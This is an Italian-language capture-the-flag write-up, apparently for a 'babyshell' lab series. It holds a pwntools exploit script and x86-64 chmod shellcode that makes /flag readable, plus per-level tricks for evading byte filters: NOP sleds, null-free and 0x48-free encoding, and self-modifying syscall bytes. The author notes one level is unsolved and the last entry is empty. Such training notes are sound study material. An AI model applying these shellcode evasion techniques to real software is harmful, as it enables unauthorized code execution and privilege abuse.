# Questo è un metodo alternativo ma che funziona più dell'altro

## Setup base

La base consiste nel creare un file python che sfrutta la libreria di pwn per eseguire tutte le challenge e lo shellcode chmod per abilitare la lettura di /flag

```py
from pwn import *

context.update(arch="amd64", encoding="latin")

challenge = "/challenge/babyshell_level1"

flag = b'flag'[::-1].hex()

shellcode = f'''
push 0x{flag}
push rsp
pop rdi

push 6
pop rsi

push 0x5a
pop rax
syscall      
'''

shellcode = asm(shellcode)

with process([challenge], cwd='/') as p:
   # print(p.recvuntil(b'[LEAK]').decode())
    p.send(shellcode)
    print(p.interactive())
```

Una volta inserito lo shellcode desiderato basta runnare il programma dalla directory in cui è contenuto facendo ```python3 nome_programma.py``` e otterremo un modulo interattivo che stampa e visualizza la challenge.  
Una volta finito basterà andare nella cartella root e, dopo aver controllato il successo del chmod usare cat per visualizzare la flag, con ```cat /flag```

## Shellcode chmod

```s
push 0x{flag}   #carica nello stack la flag
push rsp        #carica nello stack il puntatore alla cima dello stack
pop rdi         #lo sposta nel registro rdi cossichè punti al nome del file da modificare

push 6          #carica nello stack il valore dei permessi del chmod
pop rsi         #lo sposta nel registro rsi

push 0x5a       #carica nello stack il valore 90, numero della syscall chmod
pop rax         #lo sposta dentro rax
syscall         #chiama la syscall
```

## Spiegazione delle varie challenge e shellcode risolutiva

+ Livello 1 è molto basilare, prende il codice e lo esegue direttamente. La shellcode da usare è quella base del chmod

+ Livello 2 impone come restrizione di saltare fino a 2048 byte oltre l'inizio. Soluzione consiste nel inseire un nop sled, ovvero una sequenza di 2048 nop per evitare questo salto, e runnare il programma più volte finchè non passerà o darà una risposta diversa dal solito.  
Per farlo usiamo l'istruzione assembly .rept <quantità>, nello specifico:

    ```s
    start:
        .rept 2048
            nop
        .endr

        # codice continua qui
        mov rbx, 0x00000067616c662f
    ```

+ Livello 3 richiede di scrivere una shellcode senza avere NULL byte, ovvero byte 00 nel codice. I byte 00 li troviamo quando facciamo somme su registri a 64 bit con numeri non abbastanza grossi oppure quando carichiamo su un registro a 64 bit /flag lasciando 3 caratteri a 00.  
Lo shellcode base proposta risolve già il problema eseguendo solo push e pop

+ Livello 4 richiede di non avere byte che in esadecimale formino il 48, ovvero la lettera H, che sono i byte delle istruzioni mov, xor e inc a 64 bit. La soluzione è usare registri a 32 bit oppure usare push e pop nei registri.  
La shellcode base proposta risolve già il problema eseguendo solo push e pop

+ Livello 5 richiede che non ci siano chiamte dirette alla syscall in alcun modo, ma solo indirette. Si risolve andando a modificare la parte della chiamata inserendo manualmente i byte della chiamata e forzandola dunque in fase di esecuzione

    ```s
    ...
    pop rax

    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
    ```

+ Livello 6 pone le restrizioni del livello 5, ma aggiunge il blocco ai primi 4096 byte di codice il permesso di scrittura.  
La soluzione molto banale è quello di aggiungere al codice del livello 5 un nop sled di 4096 byte

    ```s
    .rept 4096
    nop
    .endr

    push 0x{flag}
    ...
    pop rax

    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
    ```

+ Livello 7 blocca dopo la prima syscall di qualsiasi shellcode tutti gli stdin e tutti gli stdout, compresi quelli degli errori, forzandoti a fare uno shellcode che faccia tutto direttamente e senza stampare nulla (o usando metodi parecchio tricky)
Lo shellcode base proposto risolve già il problema in quanto è un chmod mono stage.

+ Livello 8 richiede uno shellcode base di meno di 18 bytes e gli blocca il permesso di scrittura dei primi 4096 byte di istruzioni.  
Lo shellcode base proposto risolve già il problema in quanto è lungo 15 byte e non necessità di scrivere.

+ Livello 9 modifica 10 byte di codice ogni 10 byte di codice in 0xcc, quindi dobbiamo allungarlo parzialmente di 10 nop dopo 10 byte effettivi e runnarlo più volte per beccare il codice corretto

    ```s
    push 0x{flag}
    push rsp
    pop rdi
    jmp daje

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    daje:
    push 6
    pop rsi

    push 0x5a
    pop rax
    syscall
    ```

+ Livello 10 sorta randomicamente porzioni di 8 byte. Va runnato la challenge normale più volte

+ Livello 11 sorta randomicamente porzioni di 8 byte e chiude lo stdin, quindi ti vincola a usare uno shellcode monostage. La nostra shellcode base va bene

+ Livello 12 pone come restrizione che tutti i byte devono essere diversi, quindi non si possono usare istruzioni uguali

    ```py
    push 0x{flag}
    push rsp
    pop rdi

    mov sil, 6

    push 0x5a
    pop rax
    syscall
    ```

+ Livello 13 richiede di fare un codice di soli 12 byte. Dovrei aver trovato una soluzione ma non funzia

+ Livello 14
